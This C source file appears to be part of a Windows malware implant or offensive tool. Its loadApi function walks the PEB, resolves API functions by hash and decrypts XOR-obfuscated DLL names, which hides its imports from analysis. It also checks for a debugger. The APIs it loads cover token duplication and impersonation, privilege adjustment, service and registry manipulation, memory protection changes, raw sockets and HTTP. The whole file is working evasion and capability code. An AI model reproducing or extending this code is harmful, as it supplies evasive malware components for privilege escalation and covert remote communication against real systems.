#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#include "CalcAPI.h"
#include "LoadAPI.h"
#include "Decryption.h"

BOOL loadApi(API_Call *APICall) {
	Kernel32_API* Kernel32Api = &(APICall->Kernel32Api);
	Advapi32_API* Advapi32Api = &(APICall->Advapi32Api);
	Shell32_API* Shell32Api = &(APICall->Shell32Api);
	Ws2_32_API* Ws2_32Api = &(APICall->Ws2_32Api);
	Wininet_API* WininetApi = &(APICall->WininetApi);

	char Advapi32DllStr[] = "\x18\x2A\x23\x11\x26\x02\x64\x64\x7A\x35\x0E\x2F\x55";
	char Shell32DllStr[] = "\x3F\x04\x09\x00\x00\x5F\x5E\x42\x08\x00\x00\x6C";
	char Ws2_32DllStr[] = "\x3B\x35\x7C\x13\x6B\x74\x5D\x10\x34\x1B\x76";
	char WininetDllStr[] = "\x12\x00\x03\x07\x0B\x20\x1D\x43\x0A\x09\x29\x69";


	const DWORD hash_kernel32_dll = 0x29cdd463;
	const DWORD hash_LoadLibraryA = 0xe96ce9ef;

	PPEB pPeb = get_peb();
	if (pPeb->BeingDebugged) {
		printf("	[X] Debugger Detected !!!\n");
		//return FALSE;
	}

	LoadLibraryA_F pLoadLibraryA =(LoadLibraryA_F) find_api(pPeb, hash_kernel32_dll, hash_LoadLibraryA);
	if(pLoadLibraryA == NULL)
		return FALSE;

	decryptionRoutine(Advapi32DllStr,13,"\x59\x4E\x55\x70\x56\x6B\x57\x56\x54\x51\x62\x43\x55");
	decryptionRoutine(Shell32DllStr,12,"\x6C\x00\x57\x5A\x49\x62\x65\x54\x4C\x62\x62\x6D");
	decryptionRoutine(Ws2_32DllStr,11,"\x6C\x46\x4E\x4C\x58\x46\x73\x74\x58\x77\x76");
	decryptionRoutine(WininetDllStr,12,"\x45\x69\x6D\x6E\x65\x00\x53\x00\x6E\x4A\x49\x75");


	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
	Kernel32Api->Process32FirstF = (Process32First_F)find_api(pPeb,hash_kernel32_dll, 0x454fc0f);
	Kernel32Api->Process32NextF = (Process32Next_F)find_api(pPeb,hash_kernel32_dll, 0xa1178452);
	Kernel32Api->Process32FirstWF = (Process32FirstW_F)find_api(pPeb,hash_kernel32_dll, 0x29c93e88);
	Kernel32Api->Process32NextWF = (Process32NextW_F)find_api(pPeb,hash_kernel32_dll, 0x9d04d3df);
	Kernel32Api->CloseHandleF = (CloseHandle_F)find_api(pPeb,hash_kernel32_dll, 0xfef545);
	Kernel32Api->GetModuleFileNameWF = (GetModuleFileNameW_F)find_api(pPeb,hash_kernel32_dll, 0x34f76bdb);
	Kernel32Api->GetCurrentProcessF = (GetCurrentProcess_F)find_api(pPeb,hash_kernel32_dll, 0xc75b7345);
	Kernel32Api->OpenProcessF = (OpenProcess_F)find_api(pPeb,hash_kernel32_dll, 0x74f0acb6);
	Kernel32Api->Wow64DisableWow64FsRedirectionF = (Wow64DisableWow64FsRedirection_F)find_api(pPeb,hash_kernel32_dll, 0x7d3c70a);
	Kernel32Api->Wow64RevertWow64FsRedirectionF = (Wow64RevertWow64FsRedirection_F)find_api(pPeb,hash_kernel32_dll, 0xd6b5ef68);
	Kernel32Api->CreateFileAF = (CreateFileA_F)find_api(pPeb,hash_kernel32_dll, 0xe84b3a8e);
	Kernel32Api->DeleteFileAF = (DeleteFileA_F)find_api(pPeb,hash_kernel32_dll, 0x3e6f4637);
	Kernel32Api->VirtualProtectF = (VirtualProtect_F)find_api(pPeb,hash_kernel32_dll, 0x62c5c373);
	Kernel32Api->VirtualFreeF = (VirtualFree_F)find_api(pPeb,hash_kernel32_dll, 0x81178a12);
	Kernel32Api->VirtualAllocF = (VirtualAlloc_F)find_api(pPeb,hash_kernel32_dll, 0x38e87001);
	Kernel32Api->CreateDirectoryAF = (CreateDirectoryA_F)find_api(pPeb,hash_kernel32_dll, 0xc0a3f6f3);
	Kernel32Api->CopyFileAF = (CopyFileA_F)find_api(pPeb,hash_kernel32_dll, 0xc7c10569);
	Kernel32Api->GetModuleFileNameAF = (GetModuleFileNameA_F)find_api(pPeb,hash_kernel32_dll, 0x2af75c1d);
	Kernel32Api->GetProcessIdF = (GetProcessId_F)find_api(pPeb,hash_kernel32_dll, 0x5c36a5a9);
	Kernel32Api->CreateProcessWF = (CreateProcessW_F)find_api(pPeb,hash_kernel32_dll, 0xd5eb5d1f);
	Kernel32Api->GetWindowsDirectoryAF = (GetWindowsDirectoryA_F)find_api(pPeb,hash_kernel32_dll, 0x74566ab2);
	Kernel32Api->LocalAllocF = (LocalAlloc_F)find_api(pPeb,hash_kernel32_dll, 0x4df81bbd);
	Kernel32Api->LocalFreeF = (LocalFree_F)find_api(pPeb,hash_kernel32_dll, 0xbbf7c456);
	if(Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL ||Kernel32Api->Process32FirstWF == NULL ||Kernel32Api->Process32NextWF == NULL ||Kernel32Api->CloseHandleF == NULL ||Kernel32Api->GetModuleFileNameWF == NULL ||Kernel32Api->GetCurrentProcessF == NULL ||Kernel32Api->OpenProcessF == NULL ||Kernel32Api->Wow64DisableWow64FsRedirectionF == NULL ||Kernel32Api->Wow64RevertWow64FsRedirectionF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->DeleteFileAF == NULL ||Kernel32Api->VirtualProtectF == NULL ||Kernel32Api->VirtualFreeF == NULL ||Kernel32Api->VirtualAllocF == NULL ||Kernel32Api->CreateDirectoryAF == NULL ||Kernel32Api->CopyFileAF == NULL ||Kernel32Api->GetModuleFileNameAF == NULL ||Kernel32Api->GetProcessIdF == NULL ||Kernel32Api->CreateProcessWF == NULL ||Kernel32Api->GetWindowsDirectoryAF == NULL ||Kernel32Api->LocalAllocF == NULL ||Kernel32Api->LocalFreeF == NULL)
		return FALSE;

	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
		const DWORD Advapi32Hash = 0x35c841f5;
		memset(Advapi32DllStr,0x00,13);
		Advapi32Api->AllocateAndInitializeSidF = (AllocateAndInitializeSid_F)find_api(pPeb,Advapi32Hash, 0x4f018f3);
		Advapi32Api->CheckTokenMembershipF = (CheckTokenMembership_F)find_api(pPeb,Advapi32Hash, 0xe4c51184);
		Advapi32Api->FreeSidF = (FreeSid_F)find_api(pPeb,Advapi32Hash, 0x9543e245);
		Advapi32Api->OpenProcessTokenF = (OpenProcessToken_F)find_api(pPeb,Advapi32Hash, 0x4296f923);
		Advapi32Api->DuplicateTokenExF = (DuplicateTokenEx_F)find_api(pPeb,Advapi32Hash, 0xcca86c7e);
		Advapi32Api->ImpersonateLoggedOnUserF = (ImpersonateLoggedOnUser_F)find_api(pPeb,Advapi32Hash, 0x5d18dd4a);
		Advapi32Api->CreateProcessWithLogonWF = (CreateProcessWithLogonW_F)find_api(pPeb,Advapi32Hash, 0xae64339e);
		Advapi32Api->CreateWellKnownSidF = (CreateWellKnownSid_F)find_api(pPeb,Advapi32Hash, 0x1db4cf8c);
		Advapi32Api->GetTokenInformationF = (GetTokenInformation_F)find_api(pPeb,Advapi32Hash, 0xea1753ba);
		Advapi32Api->DuplicateTokenF = (DuplicateToken_F)find_api(pPeb,Advapi32Hash, 0xf7b60aa3);
		Advapi32Api->CreateProcessWithTokenWF = (CreateProcessWithTokenW_F)find_api(pPeb,Advapi32Hash, 0x9762c614);
		Advapi32Api->LookupPrivilegeValueAF = (LookupPrivilegeValueA_F)find_api(pPeb,Advapi32Hash, 0x7206e77e);
		Advapi32Api->LookupPrivilegeValueWF = (LookupPrivilegeValueW_F)find_api(pPeb,Advapi32Hash, 0x840703d4);
		Advapi32Api->AdjustTokenPrivilegesF = (AdjustTokenPrivileges_F)find_api(pPeb,Advapi32Hash, 0xc87f17a3);
		Advapi32Api->SetTokenInformationF = (SetTokenInformation_F)find_api(pPeb,Advapi32Hash, 0x54287bee);
		Advapi32Api->GetSidSubAuthorityF = (GetSidSubAuthority_F)find_api(pPeb,Advapi32Hash, 0x68d3863a);
		Advapi32Api->GetLengthSidF = (GetLengthSid_F)find_api(pPeb,Advapi32Hash, 0xcbfa6ae1);
		Advapi32Api->PrivilegeCheckF = (PrivilegeCheck_F)find_api(pPeb,Advapi32Hash, 0xd1152ac4);
		Advapi32Api->RegOpenKeyExAF = (RegOpenKeyExA_F)find_api(pPeb,Advapi32Hash, 0xaf60e09c);
		Advapi32Api->RegQueryValueExAF = (RegQueryValueExA_F)find_api(pPeb,Advapi32Hash, 0x8a36c2dc);
		Advapi32Api->RegCloseKeyF = (RegCloseKey_F)find_api(pPeb,Advapi32Hash, 0xd91f178a);
		Advapi32Api->RegCreateKeyExAF = (RegCreateKeyExA_F)find_api(pPeb,Advapi32Hash, 0x5f946d90);
		Advapi32Api->RegDeleteKeyAF = (RegDeleteKeyA_F)find_api(pPeb,Advapi32Hash, 0x6413c2d0);
		Advapi32Api->RegSetValueExAF = (RegSetValueExA_F)find_api(pPeb,Advapi32Hash, 0xa48d94fc);
		Advapi32Api->RegEnumKeyExAF = (RegEnumKeyExA_F)find_api(pPeb,Advapi32Hash, 0x5b5f45a9);
		Advapi32Api->LookupAccountSidAF = (LookupAccountSidA_F)find_api(pPeb,Advapi32Hash, 0x9f5e72e1);
		Advapi32Api->ConvertSidToStringSidAF = (ConvertSidToStringSidA_F)find_api(pPeb,Advapi32Hash, 0xf390c617);
		Advapi32Api->OpenSCManagerAF = (OpenSCManagerA_F)find_api(pPeb,Advapi32Hash, 0x3f7021ad);
		Advapi32Api->OpenServiceAF = (OpenServiceA_F)find_api(pPeb,Advapi32Hash, 0x7734a3fb);
		Advapi32Api->CloseServiceHandleF = (CloseServiceHandle_F)find_api(pPeb,Advapi32Hash, 0x6ab4b280);
		Advapi32Api->QueryServiceConfigAF = (QueryServiceConfigA_F)find_api(pPeb,Advapi32Hash, 0xec94d313);
		Advapi32Api->StartServiceAF = (StartServiceA_F)find_api(pPeb,Advapi32Hash, 0x19a887f9);
		Advapi32Api->QueryServiceStatusExF = (QueryServiceStatusEx_F)find_api(pPeb,Advapi32Hash, 0x22a75fdd);
		if(Advapi32Api->AllocateAndInitializeSidF == NULL ||Advapi32Api->CheckTokenMembershipF == NULL ||Advapi32Api->FreeSidF == NULL ||Advapi32Api->OpenProcessTokenF == NULL ||Advapi32Api->DuplicateTokenExF == NULL ||Advapi32Api->ImpersonateLoggedOnUserF == NULL ||Advapi32Api->CreateProcessWithLogonWF == NULL ||Advapi32Api->CreateWellKnownSidF == NULL ||Advapi32Api->GetTokenInformationF == NULL ||Advapi32Api->DuplicateTokenF == NULL ||Advapi32Api->CreateProcessWithTokenWF == NULL ||Advapi32Api->LookupPrivilegeValueAF == NULL ||Advapi32Api->LookupPrivilegeValueWF == NULL ||Advapi32Api->AdjustTokenPrivilegesF == NULL ||Advapi32Api->SetTokenInformationF == NULL ||Advapi32Api->GetSidSubAuthorityF == NULL ||Advapi32Api->GetLengthSidF == NULL ||Advapi32Api->PrivilegeCheckF == NULL ||Advapi32Api->RegOpenKeyExAF == NULL ||Advapi32Api->RegQueryValueExAF == NULL ||Advapi32Api->RegCloseKeyF == NULL ||Advapi32Api->RegCreateKeyExAF == NULL ||Advapi32Api->RegDeleteKeyAF == NULL ||Advapi32Api->RegSetValueExAF == NULL ||Advapi32Api->RegEnumKeyExAF == NULL ||Advapi32Api->LookupAccountSidAF == NULL ||Advapi32Api->ConvertSidToStringSidAF == NULL ||Advapi32Api->OpenSCManagerAF == NULL ||Advapi32Api->OpenServiceAF == NULL ||Advapi32Api->CloseServiceHandleF == NULL ||Advapi32Api->QueryServiceConfigAF == NULL ||Advapi32Api->StartServiceAF == NULL ||Advapi32Api->QueryServiceStatusExF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(Shell32DllStr) != NULL) {
		const DWORD Shell32Hash = 0x1d89f936;
		memset(Shell32DllStr,0x00,12);
		Shell32Api->ShellExecuteExAF = (ShellExecuteExA_F)find_api(pPeb,Shell32Hash, 0x8952e090);
		Shell32Api->ShellExecuteAF = (ShellExecuteA_F)find_api(pPeb,Shell32Hash, 0xda539b7f);
		if(Shell32Api->ShellExecuteExAF == NULL ||Shell32Api->ShellExecuteAF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(Ws2_32DllStr) != NULL) {
		const DWORD Ws2_32Hash = 0x5ecccd63;
		memset(Ws2_32DllStr,0x00,11);
		Ws2_32Api->connectF = (connect_F)find_api(pPeb,Ws2_32Hash, 0x782b3cd9);
		Ws2_32Api->inet_addrF = (inet_addr_F)find_api(pPeb,Ws2_32Hash, 0x52a5d3b3);
		Ws2_32Api->recvF = (recv_F)find_api(pPeb,Ws2_32Hash, 0x2a36852d);
		Ws2_32Api->closesocketF = (closesocket_F)find_api(pPeb,Ws2_32Hash, 0x71f47d22);
		Ws2_32Api->socketF = (socket_F)find_api(pPeb,Ws2_32Hash, 0x6dbcb3ec);
		Ws2_32Api->WSAGetLastErrorF = (WSAGetLastError_F)find_api(pPeb,Ws2_32Hash, 0x15818d3c);
		if(Ws2_32Api->connectF == NULL ||Ws2_32Api->inet_addrF == NULL ||Ws2_32Api->recvF == NULL ||Ws2_32Api->closesocketF == NULL ||Ws2_32Api->socketF == NULL ||Ws2_32Api->WSAGetLastErrorF == NULL)
			return FALSE;
	}else
		return FALSE;

	if(pLoadLibraryA(WininetDllStr) != NULL) {
		const DWORD WininetHash = 0x6f4f2831;
		memset(WininetDllStr,0x00,12);
		WininetApi->HttpOpenRequestAF = (HttpOpenRequestA_F)find_api(pPeb,WininetHash, 0x778a36fd);
		WininetApi->InternetSetOptionAF = (InternetSetOptionA_F)find_api(pPeb,WininetHash, 0xf0cfdd14);
		WininetApi->InternetReadFileF = (InternetReadFile_F)find_api(pPeb,WininetHash, 0x2f761326);
		WininetApi->InternetOpenAF = (InternetOpenA_F)find_api(pPeb,WininetHash, 0x78da62e7);
		WininetApi->InternetCloseHandleF = (InternetCloseHandle_F)find_api(pPeb,WininetHash, 0xd1490f26);
		WininetApi->InternetConnectWF = (InternetConnectW_F)find_api(pPeb,WininetHash, 0x27404e3f);
		WininetApi->HttpSendRequestAF = (HttpSendRequestA_F)find_api(pPeb,WininetHash, 0xc2d42b63);
		if(WininetApi->HttpOpenRequestAF == NULL ||WininetApi->InternetSetOptionAF == NULL ||WininetApi->InternetReadFileF == NULL ||WininetApi->InternetOpenAF == NULL ||WininetApi->InternetCloseHandleF == NULL ||WininetApi->InternetConnectWF == NULL ||WininetApi->HttpSendRequestAF == NULL)
			return FALSE;
	}else
		return FALSE;

	return TRUE;
}
